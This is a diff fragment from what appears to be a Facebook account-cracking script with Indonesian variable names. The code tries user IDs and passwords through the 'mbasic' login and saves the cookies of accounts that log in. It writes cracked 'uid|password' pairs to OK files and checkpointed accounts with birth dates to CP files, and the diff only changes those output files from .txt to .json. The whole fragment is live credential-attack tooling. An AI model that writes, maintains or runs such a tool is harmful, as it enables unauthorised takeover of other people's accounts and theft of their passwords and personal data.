@@ -1017,7 +1017,7 @@ def mbasic(uid, fii):
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
+			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
 			break
 		elif "checkpoint" in ses.cookies.get_dict().keys():
 			try:
@@ -1029,7 +1029,7 @@ def mbasic(uid, fii):
 					month = bulan_ttl[month]
 					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(hari_ini),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+					open("CP/%s.json"%(hari_ini),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
